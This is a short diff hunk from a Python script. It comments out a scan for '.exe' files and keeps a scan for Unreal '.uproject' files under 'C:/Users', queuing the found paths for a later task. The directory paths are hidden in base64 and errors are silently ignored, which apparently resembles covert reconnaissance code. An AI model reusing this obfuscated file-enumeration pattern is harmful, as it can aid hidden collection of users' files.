@@ -148,7 +148,7 @@ def search_extention(ext='.exe', dir_path='C:/Users'):
     return p_ls
 try:
     zovV = []
-    zovV += search_extention(dir_path=base64.b64decode('Uzov').decode(), ext='.exe')
+    #zovV += search_extention(dir_path=base64.b64decode('Uzov').decode(), ext='.exe')
     zovV += search_extention(dir_path=base64.b64decode('QzovVXNlcnM=').decode(), ext='.uproject')
     add_queue_task('ext_path_ls', dict(zovV))
 except:
